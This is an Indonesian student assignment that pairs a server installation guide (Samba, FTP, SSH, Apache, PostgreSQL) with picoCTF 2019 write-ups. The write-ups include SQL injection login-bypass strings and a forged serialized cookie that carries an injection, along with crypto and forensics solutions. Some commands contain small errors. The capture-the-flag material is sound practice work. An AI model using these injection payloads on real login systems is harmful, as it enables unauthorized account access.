# Tugas B201

## 1. Install Ubuntu Server 18.04

1. Buat boot dari Iso Ubuntu 18.04 (rufus)

2. Ikuti langkah-langkah nya

<br>

## 2. Install Samba
1. ```$ sudo apt update```

2. ```$ sudo apt install samba```

3. add user ke samba <br>
    ```$ sudo smbpasswd -a $user```

4. enable samba user <br>
    ```$ sudo smbpasswd -e $user```

5. ```$ sudo chown $user /home/sadewa```

6. ```$ sudo nano /etc/samba/smb.conf```

7. Tambahkan <br>
    [home] <br>
    comment = Samba Server <br>
    path = /home/sadewa/ <br>
    read only = no <br>
    browsable = yes <br>
    valid users = $user

8. restart samba <br>
    ```$ sudo systemctl restart smbd```

<br>

## 3. Install FTP
1. ```$ sudo apt update```

2. ```$ sudo apt install vsftpd```

3. ```$ sudo service vsftpd status```

4. Configure firewall

    ```$ sudo ufw allow 20/tcp ```

    ```$ sudo ufw allow 20/tcp ```

<br>

## 4. Install SSH
1. ```$ sudo apt update ```

2.  ```$ sudo apt install openssh-server```

3. ```$ sudo ufw allow ssh ```

4. ```$ sudo /etc/init.d/ssh status```

<br>

## 5. Install Apache
1. ```$ sudo apt get update ```

2. ```$ sudo apt-get install apache2 ```

3. ```$ sudo ufw allow 'Apache'```

    Start Apache

4. ```$ sudo /etc/init.d/apache2 start``` 

    restart Apache

5. ```$ sudo /etc/init.d/apache2 restart```

    Stop Apache
6. ```$ sudo /etc/init.d/apache2 stop ```

    Status Apache
7. ```$ sudo /etc/init.d/apache2 status```

<br>

## 6. Install PostgreSQL from source

1. Download PostgreSQL source

    ``` https://www.postgresql.org/ftp/source/v12.2/ ```

2. Install readline agar tidak error saat configure

    ```$ sudo apt-get install libreadline-dev ```

3. Extract tar dari hasil download
    
    ```$ tar postgresql-12.2.tar.gz ```

4. Masuk ke directory hasil extract an

    ```$ cd postgresql-12.2 ```

5.  Ketikkan perintah

    ```$ ./configure ```

6. Setelah selesai, compile & make file

    ```$ make ```

    lalu

    ```$ make install ```

7. Buat postgre user dan buat user data

    ```$ adduser postgres ```

    ```$ passwd postgres ```

    ```$ mkdir /usr/local/pgsql/data```

    ```$ chown postgres -R /usr/local/pgsql/data ```


8. Inisiasi postgreSQL data directory

    ```$ su -l postgres ```

    ```$ initdb -D /usr/local/pgsql/data ```

9. Include Path ke terminal
    ```$ echo 'export PATH=$PATH:/usr/local/pgsql/bin' > /etc/profile.d/postgres.sh```

9. Nyalakan service postgre

    ```$ pg_ctl start -D /usr/local/pgsql/data ```

10. Cek proses pada postgre

    ```$ ps -ef |grep -i postgres ```

11. Masuk CLI postgre

    ```$ pgsql ```

<br>
<br>
<br>

# PicoCTF Suryo 
## Iris-Name-Repo-1

``` https://2019shell1.picoctf.com/problem/27383/ ```

* Solusi Menggunakan SQL Injection pada kolom username

    ``` ' OR '1'='1' -- ```

## Iris-Name-Repo-2
* Pada kasus ini, telah difilter beberapa kata yang ada pada mysql

* Solusinya menset admin menjadi

    ``` admin'--- ```

    dan Password terserah

## Iris-Name-Repo-3
* Pada kasus ini, sql injection lebih ketat dari sebelumnya. Sehingga kata-kata yang biasa digunakan dalam sql injection tidak bisa digunakan.

* Solusi dari kasus ini adalah menggunakan algoritme enkripsi sederhana ROT13

    ``` ' BE 1=1 -- ```

## Cereal Hacker 1
* Pada masalah ini, kita diharuskan mencari cookie yang digunakan pada kredensial login.

* Setelah memasukkan username : ``` guest ``` dan password: ```guest``` (Brute Force), maka akan didapat cookies berupa

    ```TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D```

    <div style="color: blue;">
    (double urldecode + base64 decode)
    </div>

    didapatkan

    ``` O:11:"permissions":2{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";} ```

    apabila diset

    ``` O:11:"permissions":2{s:8:"username" s:5:"admin";s:8:"password";s:5:"' or '1'='1' --";}```

    akan muncul cookies baru

    ```TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MTE6Iicgb3IgJ0EnPSdBIjt9```

    dan saat dimasukkan ke halaman login maka akan muncul flag

<br>
<br>
<br>

# PicoCTF Banin
## Easy1
        A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
    +----------------------------------------------------
    A | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
    B | B C D E F G H I J K L M N O P Q R S T U V W X Y Z A
    C | C D E F G H I J K L M N O P Q R S T U V W X Y Z A B
    D | D E F G H I J K L M N O P Q R S T U V W X Y Z A B C
    E | E F G H I J K L M N O P Q R S T U V W X Y Z A B C D
    F | F G H I J K L M N O P Q R S T U V W X Y Z A B C D E
    G | G H I J K L M N O P Q R S T U V W X Y Z A B C D E F
    H | H I J K L M N O P Q R S T U V W X Y Z A B C D E F G
    I | I J K L M N O P Q R S T U V W X Y Z A B C D E F G H
    J | J K L M N O P Q R S T U V W X Y Z A B C D E F G H I
    K | K L M N O P Q R S T U V W X Y Z A B C D E F G H I J
    L | L M N O P Q R S T U V W X Y Z A B C D E F G H I J K
    M | M N O P Q R S T U V W X Y Z A B C D E F G H I J K L
    N | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M
    O | O P Q R S T U V W X Y Z A B C D E F G H I J K L M N
    P | P Q R S T U V W X Y Z A B C D E F G H I J K L M N O
    Q | Q R S T U V W X Y Z A B C D E F G H I J K L M N O P

* UFJKXQZQUNB dengan kunci SOLVECRYPTO kita bisa       menyambungkan satu - satu menggunakan tabel diatas
    - S - U = C
    - O - F = R
    - L - J = Y
    - V - K = P
    - E - X = T
    - C - Q = O
    - R - Z = I
    - Y - Q = S
    - P - U = F
    - T - N = U
    - O - B = N
* jadi flag nya adalah  `picoCTF{CRYPTOISFUN}`

## What's a net cat?
* `nc 2019shell1.picoctf.com 12265 | grep -oE "picoCTF{.*}" --color=none`
* setelah menggunakan command itu di terminal untuk netcat, muncul flag nya `picoCTF{nEtCat_Mast3ry_74df27a3}`

## Where are the robots
* "There is data encoded somewhere, there might be an online decoder"
* setelah browsing tentang png online decoder, salah satunya adalah zsteg (untuk di terminal)
* `zsteg buildings.png | grep -o "picoCTF{.*}" --color=none`
* ketemu flag nya, `picoCTF{h1d1ng_1n_th3_b1t5}`

## First Grep: Part II
* membuka directory `/problems/first-grep--part-ii_2_1c866f894e7ef69b77a69a224b0c3f60/files di shell picoctf`
* `grep -r "picoCTF{.*}" --color=none` 
* menggunakan `-r` untuk rekursif

## Flags
![](Images/flag(flags).png)
* setelah browsing menggunakan google image search, ketemu bahwa itu adalah bendera sinyal angkatan laut atau Navy Nautical Flags
* setelah diterjemagkan satu - satu, ketemu flagnya `PICOCTF{F1AG5AND5TUFF}`

## like1000
* berisi sebuah file `1000.tar` jika di extract menggunakan command `tar -xf 1000.tar` maka akan muncul file `999.tar`
* jika file `999.tar` di extract maka akan muncul file `998.tar` dan seterusnya
* Hint : "Try and script this, it'll save you alot of time", jadi extract menggunakan rekursif bash
* `for ((i = 1000; i > 0; i--)); do
	if [ ! -f "$i.tar" ]; then
		break;
	fi	
	tar -xvf $i.tar
	rm $i.tar
done`
* setelah command itu dijalankan, maka file `.tar` automatis ke extract sampai file `1.tar` dan sebuah file png
![](Images/flag(like1000).png)
* flagnya adalah `picoCTF{l0t5_0f_TAR5}`





















